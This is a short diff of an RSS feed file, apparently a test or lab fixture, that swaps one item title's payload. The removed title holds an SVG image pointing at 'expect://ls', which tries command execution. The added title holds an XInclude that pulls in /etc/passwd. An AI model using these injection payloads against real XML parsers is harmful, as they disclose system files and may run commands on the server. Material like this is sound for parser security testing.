@@ -14,11 +14,8 @@
       <description>Tout  savoir sur RSS</description>
    </item>
    <item>
-   <title>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
-    <image xlink:href="expect://ls"></image>
-</svg>
-   </title>
+<title xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></title>
     <link>https://www.xul.fr/xml-rdf.php</link> 
     <description>Et  tout savoir sur RDF</description>
    </item>
